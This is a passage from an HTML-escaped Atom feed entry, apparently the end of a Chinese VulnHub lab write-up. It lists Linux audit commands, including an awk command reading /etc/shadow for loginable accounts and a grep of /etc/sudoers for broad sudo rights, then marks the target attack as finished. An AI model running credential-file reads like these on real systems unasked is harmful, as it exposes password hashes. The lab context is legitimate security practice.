class=&#34;language-bash&#34;&gt;查询可以远程登录的帐号信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;awk &amp;#x27;/\$1|\$6/&amp;#123;print $1&amp;#125;&amp;#x27; /etc/shadow&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;除root帐号外，其他帐号是否存在sudo权限。如没有必要，普通帐号应删除sudo权限&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;more /etc/sudoers | grep -v &amp;quot;^#\|^$&amp;quot; | grep &amp;quot;ALL=(ALL)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-252.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 靶机攻击结束&lt;/p&gt;
</content>
        <category term="VULNHUB 11-20" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
</feed>
